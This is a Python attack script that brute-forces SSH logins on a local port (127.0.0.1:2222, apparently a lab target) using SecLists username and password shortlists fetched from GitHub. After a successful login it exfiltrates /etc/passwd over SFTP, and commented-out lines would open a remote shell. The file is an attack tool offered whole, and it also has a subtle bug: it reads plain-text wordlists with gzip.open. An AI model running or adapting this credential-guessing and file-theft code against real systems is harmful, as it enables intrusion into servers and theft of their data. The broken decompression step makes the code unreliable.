from pwn import *
import paramiko
import requests
import shutil
import gzip

# Download the common passwords file
def download_file(url):
    local_filename = url.split('/')[-1]
    with requests.get(url, stream=True) as r:
        with open(local_filename, 'wb') as f:
            shutil.copyfileobj(r.raw, f)
    return local_filename

def connect_passw_spray(host, port, timeout, url_username, url_password):
    attempts = 0
    user_file = download_file(url_username)
    pass_file = download_file(url_password)
    print("*** Attempts ***")
    #Decompress the file and read line per line
    user_list = gzip.open(user_file, "rb")
    pass_list = gzip.open(pass_file, "rb")
    for user in user_list:
        username  = user.decode("utf-8").strip("\n")
        # Reset the password iterator for every username
        pass_list.seek(0)
        for passw in pass_list:
            password  = passw.decode("utf-8").strip("\n")
            try:
                client = paramiko.client.SSHClient()
                client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy)
                client.connect(
                    hostname=host,
                    port=port,
                    username=username,
                    password=password,
                    timeout=timeout,
                    look_for_keys=False,
                    allow_agent=False
                )
                print("[{}] Valid credentials found: '{}, {}'".format(attempts, username, password))
                return client
            except paramiko.ssh_exception.AuthenticationException:
                print("[{}] Invalid credentials: '{}, {}'".format(attempts, username, password))
            except paramiko.ssh_exception.SSHException:
                print("[{}] Connection closed".format(attempts))
            except Exception as e:
                print(e)
            attempts += 1
    print("Password spray failed")
    return None

def exfiltrate_files(client):
    print("*** File Exfiltration Attack ***")
    try:
        sftp = client.open_sftp()
        remote_file = "/etc/passwd"
        local_file = "exfiltrated_passwd.txt"
        sftp.get(remote_file, local_file)
        print(f"File exfiltrated: {remote_file} -> {local_file}")
    except Exception as e:
        print(f"Error during file exfiltration: {e}")

def main():
    host = "127.0.0.1"
    port = 2222
    timeout = None
    url_user = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt"
    url_pass = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/top-passwords-shortlist.txt"
    client = connect_passw_spray(host, port, timeout, url_user, url_pass)
    if client is None :
        return
    try:
        exfiltrate_files(client)
        #shell = client.invoke_shell()
        #time.sleep(1)
        #shell.send('ls -a\n')
        #print(shell.recv(4096).decode('utf-8'))
    except Exception as e:
        print(e)
    finally:
        client.close()

if __name__ == "__main__":
    main()
